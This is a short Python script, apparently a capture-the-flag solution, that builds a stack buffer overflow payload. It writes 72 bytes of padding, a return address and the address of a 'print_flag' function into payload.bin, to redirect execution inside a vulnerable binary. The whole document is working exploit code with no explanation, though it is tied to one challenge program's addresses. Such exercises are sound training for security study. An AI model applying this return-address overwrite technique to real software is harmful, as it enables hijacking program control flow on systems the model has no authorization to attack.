import struct

padding = b"A" * 72
ret_addr = struct.pack("<Q", 0x401364)
print_flag_addr = struct.pack("<Q", 0x401416)

payload = padding + ret_addr + print_flag_addr + b"\n"

with open("payload.bin", "wb") as f:
    f.write(payload)